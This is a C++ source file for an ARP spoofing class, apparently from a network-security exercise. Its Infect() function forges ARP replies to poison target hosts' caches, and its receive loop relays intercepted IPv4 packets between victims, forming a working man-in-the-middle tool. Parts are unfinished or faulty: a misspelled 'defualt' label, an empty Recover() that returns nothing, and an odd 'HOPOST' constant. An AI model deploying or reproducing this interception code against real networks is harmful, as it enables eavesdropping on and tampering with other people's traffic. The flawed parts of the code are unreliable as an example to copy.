#include "arpspoofing.h"

using namespace std;


void ArpSpoofing::RecvPacketThreadFunc() {
    while(1) {
        usleep(10);

        switch(this->status_) {
            case STATUS_INIT: {
                break;
            }
            case STATUS_PAUSE: {
                unique_lock<mutex> t(this->mtx_);
                this->cv_.wait(t);
                t.unlock();
                break;
            }
            case STATUS_PLAY: {
                unique_lock<mutex> t(this->mtx_);
                if(this->ReadPacket()) {
                    for(Flow& flow : flowList_) {
                        RecvData data = this->GetPacket(EthHdr::Ip4, string(flow.sip_), IpHdr::ICMP, 0);
                        if(!data.empty()) {
                            PEthHdr pEtherHeader = reinterpret_cast<PEthHdr>(data.buf);
                            PIpHdr pIpHeader = reinterpret_cast<PIpHdr>(data.buf + sizeof(EthHdr));
                            if(pIpHeader->dip().compare(string(flow.sip_)) == 0) {
                                //relay ip packet
                                pEtherHeader->dmac_ = arpTable_[flow.sip_];
                            }else
                                //spoofed ip packet
                                pEtherHeader->dmac_ = arpTable_[flow.tip_];

                            SendPacket(data.buf, data.header->len);
                        }

                        data = this->GetPacket(EthHdr::Arp, string(flow.sip_), IpHdr::HOPOST, 0);
                        if(!data.empty())
                            Infect();
                    }
                }
                t.unlock();
                break;
            }
            case STATUS_END: {
                goto END;
                break;
            }
        defualt:
            break;
        }
    }
END:
    return;
}

void ArpSpoofing::ResolveMac(const string targetIP) {
    //if(arpTable_[targetIP] != NULL) return;

    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    try {
        if(sock < 0)
            throw runtime_error("Failed to create socket");

        arpreq req{};

        //memcpy(req.arp_dev, cInterfaceInfo_.interfaceName_.c_str(), sizeof(req.arp_dev));
        memcpy(req.arp_dev, cInterfaceInfo_.interfaceName_.data(), sizeof(req.arp_dev));

        req.arp_pa.sa_family = AF_INET;
        //inet_pton(AF_INET, targetIP.c_str(), &reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr);
        inet_pton(AF_INET, targetIP.data(), &reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr);

        if(ioctl(sock, SIOCGARP, &req) == -1)
            throw runtime_error("Failed to set ioctl");

        arpTable_[Ip(targetIP)] = reinterpret_cast<u_char*>(req.arp_ha.sa_data);

    }catch(const exception& e) {
        cerr<<"GetMacAddress : "<<e.what()<<endl;
        cerr<<"Error : "<<errno<<" ("<<strerror(errno)<<")"<<endl;
    }

    close(sock);
}

bool ArpSpoofing::Infect() {
    try {
        //if(cInterfaceInfo_ == NULL) throw runtime_error("interface is not setup.");
        for(Flow& flow : flowList_) {
            ResolveMac(string(flow.tip_));
            Mac& targetMac = arpTable_[flow.tip_];

            //Mac targetMac = arpTable_(string(flow.tip_));
            if(targetMac.isNull()) throw runtime_error("target mac is null");

            EthArpPacket packet{};

            packet.eth_.dmac_ = targetMac;
            packet.arp_.tmac_ = targetMac;

            packet.eth_.smac_ = cInterfaceInfo_.mac_;
            packet.arp_.smac_ = cInterfaceInfo_.mac_;


            packet.eth_.type_ = htons(EthHdr::Arp);
            packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
            packet.arp_.protocolType_ = htons(EthHdr::Ip4);
            packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
            packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
            packet.arp_.opCode_ = htons(ArpHdr::OpCodeType::Arp_Reply);

            //inet_pton(AF_INET, flow.sip_.toStdString().c_str(), &packet.arp_.sip_);
            //inet_pton(AF_INET, flow.tip_.toStdString().c_str(), &packet.arp_.tip_);

            packet.arp_.sip_ = htonl(flow.sip_);
            packet.arp_.tip_ = htonl(flow.tip_);

            SendPacket(reinterpret_cast<uint8_t*>(&packet), sizeof(EthArpPacket));
        }

    }catch(const std::exception& e) {
        cerr<<"Failed to infect : "<<e.what()<<endl;
        return false;
    }
    return true;
}

bool ArpSpoofing::Recover() {
    for(Flow& flow : flowList_) {

    }
}

//public
ArpSpoofing::ArpSpoofing() {
    OpenThread();
}

ArpSpoofing::~ArpSpoofing() {
    this->end();
    this->hPThread_.join();
}



void ArpSpoofing::Register(const QString senderIP, const QString targetIP) {
    unique_lock<mutex> t(mtx_);
    flowList_.push_back(Flow(senderIP, targetIP));
}

void ArpSpoofing::Register(const Flow flow) {
    unique_lock<mutex> t(mtx_);
    flowList_.push_back(flow);
}

void ArpSpoofing::Register(const std::vector<Flow> flow) {
    unique_lock<mutex> t(mtx_);
    for(const Flow& f : flow) {
        flowList_.push_back(f);
    }
}

void ArpSpoofing::Delete(const QString senderIP, const QString targetIP) {
    unique_lock<mutex> t(mtx_);

    flowList_.remove(Flow(senderIP, targetIP));
}

void ArpSpoofing::Delete(const Flow flow) {
    unique_lock<mutex> t(mtx_);

    flowList_.remove(flow);
}

void ArpSpoofing::Delete(const std::vector<Flow> flow) {
    unique_lock<mutex> t(mtx_);

    for(const Flow& f : flow) {
        flowList_.remove(f);
    }
}

list<Flow> ArpSpoofing::GetFlows() {
    unique_lock<mutex> t(mtx_);
    return flowList_;
}

void ArpSpoofing::Run() {
    Infect();
    play();
}
